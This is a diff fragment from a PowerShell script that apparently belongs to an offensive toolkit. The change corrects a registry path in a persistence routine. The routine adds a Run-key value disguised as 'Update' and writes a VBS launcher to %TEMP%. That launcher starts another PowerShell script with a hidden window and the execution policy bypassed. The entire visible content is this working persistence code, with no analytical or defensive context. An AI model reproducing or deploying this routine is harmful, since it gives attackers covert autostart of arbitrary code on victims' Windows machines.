@@ -52,7 +52,7 @@ http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/20/use-powershell-to-
     }
     else
     {
-        New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -PropertyType String -Value $env:TEMP\$name -force
+        New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -PropertyType String -Value $env:TEMP\$name -force
         echo "Set objShell = CreateObject(`"Wscript.shell`")" > $env:TEMP\$name
         echo "objShell.run(`"powershell -WindowStyle Hidden -executionpolicy bypass -file $env:temp\$modulename`")" >> $env:TEMP\$name
     }    
